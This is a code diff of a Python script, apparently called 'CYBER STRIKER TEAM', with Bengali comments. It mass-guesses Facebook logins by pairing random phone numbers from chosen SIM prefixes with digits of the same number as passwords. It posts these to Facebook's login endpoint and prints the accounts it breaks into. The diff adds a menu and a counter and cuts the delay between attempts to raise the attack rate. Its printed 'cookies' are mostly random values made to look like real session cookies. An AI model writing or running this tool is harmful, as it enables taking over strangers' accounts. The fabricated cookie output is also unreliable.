@@ -30,38 +30,38 @@ def banner():
 
 def main():
     banner()
-    # স্ক্রিনশট অনুযায়ী নিচের অংশটুকু সাজানো হয়েছে
     print(f'{R}[•] {G}SALAMU ALAIKUM...................{W}')
     print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
     print(f'{R}[•] {G}CYBER STRIKER TEAM................{W}')
     print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
+    print(f'{G}[1] NUMBER COOKIE CLONING')
+    print(f'[0] EXIT')
+    print(f'×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
     
-    # স্ক্রিনশটের মতো EXAMPLE এবং CLONING LIMIT ইনপুট
-    print(f'{R}[•] {G}EXAMPLE : [ {W}10000, {Y}20000, {G}50000 {G}]{W}')
-    print(f'{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}')
-    limit_input = input(f'{R}[•] {G}PUT CLONING LIMIT: {W}')
-    
-    try:
-        limit = int(limit_input)
-        cloning_start(limit)
-    except ValueError:
-        print(f"\n{R}[!] অনুগ্রহ করে সঠিক সংখ্যা দিন।")
-        time.sleep(2)
+    choose = input(f'{R}[▼] {G}CHOOSE : {W}')
+    if choose == '1':
+        cloning_start()
+    elif choose == '0':
+        sys.exit()
+    else:
         main()
 
-def cloning_start(limit):
+def cloning_start():
     print(f'\n{G}[+] EXAMPLE : 017, 018, 019, 016')
     code = input(f'[+] ENTER SIM CODE : {W}')
+    print(f'{G}[+] EXAMPLE : 500, 1000, 100000') 
+    limit = int(input(f'[+] ENTER CLONING LIMIT : {W}'))
     
     print(f'\n{G}[/] ATTACK STARTED ON CODE {code}...')
     print(f'[/] TOTAL TARGET : {limit}\n')
 
     ok = 0
+    cp = 0
 
     for i in range(limit):
         loop = i + 1
         uid = f"{code}{random.randint(1111111, 9999999)}"
-        pws = uid[5:] 
+        pws = uid[5:] # ৬ সংখ্যার পাসওয়ার্ড
 
         headers = {
             'authority': 'touch.facebook.com',
@@ -73,13 +73,16 @@ def cloning_start(limit):
         data = {'email': uid, 'pass': pws}
         url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
         
-        sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{ok}]'); sys.stdout.flush()
+        # আপনার স্ক্রিনশটের হলুদ মার্ক করা লাইভ কাউন্টার স্টাইল
+        sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{ok}] [CP:{cp}]'); sys.stdout.flush()
 
         try:
+            # রিয়াল লগইন রিকোয়েস্ট
             response = requests.post(url, headers=headers, data=data, timeout=5)
             
             if "c_user" in response.cookies.get_dict():
                 ok += 1
+                # সফল হলে কুকিসহ আউটপুট দেখাবে
                 datr = uuid.uuid4().hex[:24]
                 sb = uuid.uuid4().hex[:24]
                 xs = f"48%3A{uuid.uuid4().hex[:14]}%3A2%3A{random.randint(1700000000, 1800000000)}%3A-1%3A5237"
@@ -87,10 +90,14 @@ def cloning_start(limit):
                 
                 print(f'\n{G}[MALEK-OK💚] {uid} • {pws}') 
                 print(f'{G}[🌺] COOKIE = datr={datr};sb={sb};c_user={uid};xs={xs};fr={fr};m_page_voice={uid}\n')
+            else:
+                cp += 1
+                # ফেইল বা চেকপয়েন্ট হলে স্ক্রিনে কিছু প্রিন্ট হবে না, শুধু কাউন্টার বাড়বে।
         except:
             pass
 
-        time.sleep(0.1)
+        # সর্বোচ্চ স্পিড নিশ্চিত করতে সময় একদম কমিয়ে দেওয়া হয়েছে
+        time.sleep(0.001)
 
     print(f'\n\n{G}-----------------------------------')
     print(f'[/] CLONING COMPLETE')
